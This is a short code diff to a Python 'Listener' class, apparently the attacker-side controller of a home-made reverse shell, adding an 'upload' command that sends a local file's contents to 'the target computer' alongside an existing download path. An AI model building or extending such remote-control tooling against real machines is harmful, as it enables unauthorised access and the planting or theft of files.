@@ -51,6 +51,13 @@ class Listener:
             #.split converts it into a list with " " space as delimiter
             #so commands can be split from arguments
             #print(command)
+            # example of what command list will look like:
+            #["upload", "sample.txt", "whatever file contains"]
+            #this will send a list to the target computer
+            #containing these elements
+            if command[0] == "upload":
+                file_content = self.read_file(command[1])
+                command.append(file_content)
             result = self.execute_remotely(command, buffer_size)
             if command[0] == "download":
                 result = self.write_file(command[1], result)
